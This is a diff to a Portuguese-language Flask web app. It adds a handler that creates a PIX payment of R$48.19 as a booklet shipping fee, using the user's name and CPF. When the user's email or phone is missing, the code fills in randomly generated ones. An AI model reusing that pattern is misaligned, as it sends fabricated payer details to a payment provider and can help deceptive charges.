@@ -422,6 +422,28 @@ def frete_apostila():
         flash('Sessão expirada. Por favor, faça a consulta novamente.')
         return redirect(url_for('index'))
 
+    if request.method == 'POST':
+        try:
+            payment_api = create_payment_api()
+            payment_data = {
+                'name': user_data['nome_real'], 
+                'email': user_data.get('email', generate_random_email()), 
+                'cpf': user_data['cpf'],
+                'phone': user_data.get('phone', generate_random_phone()), 
+                'amount': 48.19  # Valor do frete
+            }
+
+            pix_data = payment_api.create_pix_payment(payment_data)
+            return render_template('pagamento.html',
+                               pix_data=pix_data,
+                               valor_total="48,19",
+                               current_year=datetime.now().year)
+
+        except Exception as e:
+            logger.error(f"Erro ao gerar pagamento: {e}")
+            flash('Erro ao gerar o pagamento. Por favor, tente novamente.')
+            return redirect(url_for('index'))
+
     return render_template('frete_apostila.html', 
                          user_data=user_data,
                          current_year=datetime.now().year)
